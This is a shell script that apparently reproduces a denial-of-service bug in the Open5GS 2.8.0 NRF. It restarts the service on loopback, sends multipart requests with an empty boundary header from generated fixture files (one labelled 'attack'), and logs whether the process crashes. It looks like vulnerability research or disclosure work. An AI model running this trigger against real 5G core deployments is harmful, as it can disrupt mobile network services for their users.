#!/bin/sh
# Real Open5GS 2.8.0 NRF, loopback-only h2c replay of the boundary bug.
# Each case gets a fresh NRF process; the attack may fault it.
set -u
HERE=$(CDPATH= cd -- "$(dirname "$0")" && pwd)
P=$HERE/../local-prefix
BIN=${NRF_BIN:-$HERE/../build/bld/src/nrf/open5gs-nrfd}
LOG=$HERE/evidence
FIX=$HERE/fixtures
URI=http://127.0.0.1:18777/nnrf-nfm/v1/nf-instances
export LD_LIBRARY_PATH="$P/usr/lib/x86_64-linux-gnu"
mkdir -p "$LOG" "$FIX"
[ -x "$BIN" ] || { echo "NO BIN: $BIN"; exit 2; }

wait_port() {
    want=$1
    i=0
    while [ "$i" -lt 100 ]; do
        if ss -ltn 2>/dev/null | grep -q ':18777'; then open=1; else open=0; fi
        [ "$open" = "$want" ] && return 0
        sleep 0.1
        i=$((i + 1))
    done
    return 1
}

run_case() {
    name=$1
    body=$2
    tag=${TAG:-run}
    : > "$LOG/$tag-$name.stdout"
    "$BIN" -c "$HERE/nrf.yaml" > "$LOG/$tag-$name.stdout" 2>&1 &
    pid=$!
    if ! wait_port 1; then echo "CASE=$name START-FAIL"; return 1; fi
    curl -sS --http2-prior-knowledge -o "$LOG/$tag-$name.response" \
        -w 'code=%{http_code} proto=%{http_version} size=%{size_download}\n' \
        --max-time 10 -H 'Content-Type: multipart/related; boundary=""' \
        --data-binary "@$body" "$URI" > "$LOG/$tag-$name.curl" 2>&1
    curl_rc=$?
    sleep 0.3
    if kill -0 "$pid" 2>/dev/null; then
        alive=YES
        kill "$pid" 2>/dev/null || true
        if wait "$pid"; then rc=0; else rc=$?; fi
    else
        alive=NO
        if wait "$pid"; then rc=0; else rc=$?; fi
    fi
    wait_port 0 || true
    echo "CASE=$name curl_rc=$curl_rc nrf_alive=$alive nrf_rc=$rc"
    echo "  CURL: $(cat "$LOG/$tag-$name.curl")"
    echo "  RESP: $(head -c 200 "$LOG/$tag-$name.response" 2>/dev/null || true)"
    echo "  LOG: $(grep -E 'ERROR|FATAL|multipart|boundary|Aborted|segmen' "$LOG/$tag-$name.stdout" 2>/dev/null | tail -6 | tr '\n' '|')"
}

sh "$HERE/mkfixtures.sh" > /dev/null
for spec in "staged:$FIX/staged-394.bin" "safe:$FIX/safe-10.bin" "abc:$FIX/abc-396.bin" "attack:$FIX/attack-396.bin"; do
    name=${spec%%:*}
    body=${spec#*:}
    run_case "$name" "$body"
done
